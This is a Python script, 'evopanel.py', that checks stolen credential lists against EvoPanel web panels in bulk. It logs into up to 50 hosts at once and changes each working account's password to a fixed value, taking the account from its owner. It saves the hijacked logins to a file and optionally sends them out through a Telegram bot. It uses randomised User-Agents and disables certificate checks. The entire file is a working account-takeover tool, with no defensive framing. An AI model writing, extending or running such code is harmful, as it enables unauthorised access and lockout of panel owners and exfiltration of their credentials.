"""
evopanel.py — EvoPanel Checker (High Performance)
==================================================
• aiohttp async — 50 concurrent checks at once (vs 1 with requests)
• Watches Evopanel-Filter/ for new files dropped by down.py
• Login → change password → save valid to Evopanel-Valid/
• Invalid entries are NOT saved
• Telegram notification on success

Usage:
    python evopanel.py                    # watch mode (default)
    python evopanel.py path/to/file.txt   # single file mode
"""

import asyncio
import aiohttp
import aiofiles
import os
import re
import sys
import ssl
import time
import hashlib
from datetime import datetime
from fake_useragent import UserAgent

ua = UserAgent()

# ── Config ─────────────────────────────────────────────────────────────────────
NEW_PASSWORD  = "Mnizar@012"
TG_TOKEN      = ""          # optional: your bot token
TG_CHAT_ID    = ""          # optional: your chat id

CONCURRENCY   = 50          # simultaneous connections
TIMEOUT       = aiohttp.ClientTimeout(total=15)

# ── Folders ────────────────────────────────────────────────────────────────────
WATCH_DIR     = "../Filter/Evopanel-Filter"
VALID_DIR     = "../results-cms/Evopanel-Valid"
PROCESSED_DIR = "../results-cms/Evopanel-Filter/processed"

for _d in [WATCH_DIR, VALID_DIR, PROCESSED_DIR]:
    os.makedirs(_d, exist_ok=True)

# ── SSL (skip verify — same as requests verify=False) ──────────────────────────
SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE


# ── Logging ────────────────────────────────────────────────────────────────────

def log(tag: str, msg: str):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] [{tag}] {msg}", flush=True)


# ── Telegram (async) ───────────────────────────────────────────────────────────

async def send_telegram(session: aiohttp.ClientSession, url: str, username: str, password: str):
    if not TG_TOKEN or not TG_CHAT_ID:
        return
    try:
        domain = re.findall(r'://(.*?)(?:/|:|$)', url)
        domain_str = domain[0] if domain else url
        text = (
            f"✅ *EvoPanel Valid*\n"
            f"🌐 Domain: `{domain_str}`\n"
            f"🔗 URL: `{url}`\n"
            f"👤 Username: `{username}`\n"
            f"🔑 Password: `{password}`"
        )
        await session.post(
            f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
            json={"chat_id": TG_CHAT_ID, "text": text, "parse_mode": "Markdown"},
            timeout=aiohttp.ClientTimeout(total=10)
        )
    except Exception as e:
        log("TELEGRAM", f"Failed: {e}")


# ── Entry parser ───────────────────────────────────────────────────────────────

def normalize_url(raw: str) -> str:
    raw = raw.strip()
    if raw and not raw.startswith("http://") and not raw.startswith("https://"):
        raw = "https://" + raw
    return raw


def parse_entry(line: str):
    """
    Returns (url, username, password) or (None, None, None).
    Supports:
      https://host:port|username|password
      https://host:port:username:password
    """
    line = normalize_url(line.strip())
    if not line:
        return None, None, None
    try:
        if "|" in line:
            parts = line.split("|")
            if len(parts) >= 3:
                return parts[0].strip(), parts[1].strip(), parts[2].strip()
        else:
            scheme, rest = line.split("://", 1)
            parts = rest.split(":")
            if len(parts) >= 3:
                if parts[1].isdigit():
                    url  = f"{scheme}://{parts[0]}:{parts[1]}"
                    user = parts[2]
                    pwd  = ":".join(parts[3:]) if len(parts) > 3 else ""
                else:
                    url  = f"{scheme}://{parts[0]}"
                    user = parts[1]
                    pwd  = ":".join(parts[2:]) if len(parts) > 2 else ""
                return url.strip(), user.strip(), pwd.strip()
    except Exception:
        pass
    return None, None, None


# ── Core async checker ─────────────────────────────────────────────────────────

async def check_entry(session: aiohttp.ClientSession, semaphore: asyncio.Semaphore,
                       url: str, username: str, password: str) -> bool:
    """
    Login → if success, change password immediately using the same session cookies.
    Returns True if both login and password change succeeded.
    """
    headers = {
        "User-Agent": ua.random,
    }

    async with semaphore:
        # ── Step 1: Login ──────────────────────────────────────────────────────
        try:
            async with session.post(
                url + "/api/login",
                json={"username": username, "password": password},
                headers=headers,
                ssl=SSL_CTX,
                allow_redirects=True
            ) as resp:
                text = await resp.text()
                if resp.status != 200 or "sessionID" not in text:
                    log("EvoPanel", f"❌ Login failed  → {url}")
                    return False
        except asyncio.TimeoutError:
            log("EvoPanel", f"⏱ Timeout       → {url}")
            return False
        except Exception as e:
            log("EvoPanel", f"⚠️  Error         → {url} : {e}")
            return False

        log("EvoPanel", f"✅ Logged in    → {url} ({username})")

        # ── Step 2: Change password (cookies already in session) ───────────────
        try:
            async with session.post(
                url + "/api/change-password",
                json={
                    "currentPassword": password,
                    "newPassword":     NEW_PASSWORD
                },
                headers={
                    **headers,
                    "Referer": url + "/evo/user/profile/general"
                },
                ssl=SSL_CTX,
                allow_redirects=False
            ) as resp:
                if resp.status == 204:
                    log("EvoPanel", f"🔑 Pwd changed  → {url}")
                    await send_telegram(session, url, username, NEW_PASSWORD)
                    # Save valid result
                    async with aiofiles.open(
                        os.path.join(VALID_DIR, "valid.txt"), "a", encoding="utf-8"
                    ) as f:
                        await f.write(f"{url}|{username}|{NEW_PASSWORD}\n")
                    return True
                else:
                    log("EvoPanel", f"⚠️  Pwd change failed (HTTP {resp.status}) → {url}")
                    return False
        except Exception as e:
            log("EvoPanel", f"⚠️  Change error → {url} : {e}")
            return False


# ── File processor ─────────────────────────────────────────────────────────────

async def process_file(file_path: str):
    log("WATCH", f"📄 New file: {file_path}")

    async with aiofiles.open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        raw_lines = await f.readlines()

    entries = []
    for line in raw_lines:
        url, username, password = parse_entry(line)
        if url:
            entries.append((url, username, password))
        else:
            log("PARSE", f"⚠️  Skipping: {line.strip()}")

    if not entries:
        log("WATCH", "No valid entries found.")
    else:
        log("WATCH", f"🚀 Checking {len(entries)} entries with {CONCURRENCY} concurrent workers...")

        semaphore  = asyncio.Semaphore(CONCURRENCY)
        connector  = aiohttp.TCPConnector(ssl=SSL_CTX, limit=CONCURRENCY + 10)

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=TIMEOUT
        ) as session:
            tasks  = [check_entry(session, semaphore, u, usr, pwd) for u, usr, pwd in entries]
            results = await asyncio.gather(*tasks, return_exceptions=True)

        valid = sum(1 for r in results if r is True)
        log("WATCH", f"Done — ✅ {valid}/{len(entries)} changed.")

    # Move to processed
    dest = os.path.join(PROCESSED_DIR, os.path.basename(file_path))
    os.replace(file_path, dest)
    log("WATCH", f"Moved to processed: {dest}")


# ── Watcher ────────────────────────────────────────────────────────────────────

def file_hash(path: str) -> str:
    h = hashlib.md5()
    with open(path, "rb") as f:
        h.update(f.read(4096))
    return h.hexdigest()


async def watch():
    log("WATCH", f"👀 Listening on '{WATCH_DIR}/' ... (Ctrl+C to stop)")
    seen = {}

    while True:
        try:
            for fname in os.listdir(WATCH_DIR):
                if not fname.endswith(".txt"):
                    continue
                fpath = os.path.join(WATCH_DIR, fname)
                if not os.path.isfile(fpath):
                    continue
                fhash = file_hash(fpath)
                if seen.get(fname) == fhash:
                    continue
                seen[fname] = fhash
                await process_file(fpath)
        except KeyboardInterrupt:
            log("WATCH", "Stopped.")
            break
        except Exception as e:
            log("ERROR", str(e))

        await asyncio.sleep(3)


# ── Entry point ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) > 1:
        asyncio.run(process_file(sys.argv[1]))
    else:
        asyncio.run(watch())